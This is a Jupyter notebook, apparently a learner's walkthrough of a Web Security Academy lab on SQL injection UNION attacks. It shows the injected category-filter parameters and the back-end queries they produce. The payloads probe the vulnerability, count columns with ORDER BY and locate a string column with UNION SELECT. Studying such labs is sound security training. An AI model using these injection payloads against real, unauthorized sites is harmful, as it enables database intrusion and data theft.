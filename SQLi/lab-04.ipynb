{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab: SQL injection UNION attack, finding a column containing text\n",
    "\n",
    "- sqli: product category filter\n",
    "- end goal: determine which columns are compatible with string data"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analysis\n",
    "- url: `https://0a11008d03b0377784e4dcdf00640037.web-security-academy.net/`\n",
    "\n",
    "- front-end: `/filter?category=Lifestyle`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from products where category = 'Lifestyle' and released = 1\n",
    "```\n",
    "\n",
    "- check sqli vulnerability\n",
    "- front-end: `/filter?category=Lifestyle'`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from products where category = 'Lifestyle'' and released = 1\n",
    "'-- 500 Internal Server Error \n",
    "```\n",
    "\n",
    "- front-end: `/filter?category=Lifestyle'--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from products where category = 'Lifestyle'--' and released = 1\n",
    "-- 200 OK: this website have a sqli vulnerability\n",
    "```\n",
    "\n",
    "- determine how many columns\n",
    "- front-end: `/filter?category=Lifestyle' order by 3--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from products where category = 'Lifestyle' order by 3--' and released = 1\n",
    "-- 200 OK: this website have 3 columns\n",
    "```\n",
    "\n",
    "- determine how many strings which contain in columns\n",
    "- front-end: `/filter?category=Lifestyle' union select 'text', null, null--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from products where category = 'Lifestyle' union select 'text', null, null--' and released = 1\n",
    "-- 500 Internal Server Error \n",
    "```\n",
    "- you should change the position of text untill you see 200 OK like this\n",
    "- front-end: `/filter?category=Lifestyle' union select null, 'text', null--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from products where category = 'Lifestyle' union select null, 'text', null--' and released = 1\n",
    "-- 200 OK: second column is a type of string\n",
    "```\n",
    "- you gonna see this message: `Make the database retrieve the string: 'd6KqGR'`\n",
    "- chage `text` by useing this keyword `d6KqGR`\n",
    "- front-end: `/filter?category=Lifestyle' union select null, 'd6KqGR', null--`\n",
    "- back-end:\n",
    "```sql\n",
    "select * from products where category = 'Lifestyle' union select null, 'd6KqGR', null--' and released = 1\n",
    "-- 200 OK: Congratulations, you solved the lab!\n",
    "```\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
